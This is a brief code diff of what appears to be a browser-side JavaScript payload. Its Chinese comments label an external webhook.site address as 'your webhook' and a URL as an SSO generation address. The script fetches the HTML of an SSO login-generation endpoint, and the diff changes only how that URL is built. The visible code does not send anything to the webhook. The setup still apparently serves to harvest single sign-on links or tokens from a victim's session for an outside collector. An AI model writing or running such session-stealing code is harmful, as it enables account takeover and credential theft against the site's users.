@@ -2,7 +2,7 @@
 	// 你的 Webhook 地址
 	var webhook = "https://webhook.site/03cb0e83-4629-4064-855a-f7562f59068d";
 	// SSO 生成地址
-	var ssoUrl = `ssoIndex.do?apOu=GuidanceApp_LDAP&datetime1=${Date.now()}`;
+	var ssoUrl = "/ssoIndex.do?apOu=GuidanceApp_LDAP&datetime1=" + Date.now();
 	try {
 		const response = await fetch(ssoUrl);
 		const html = await response.text();
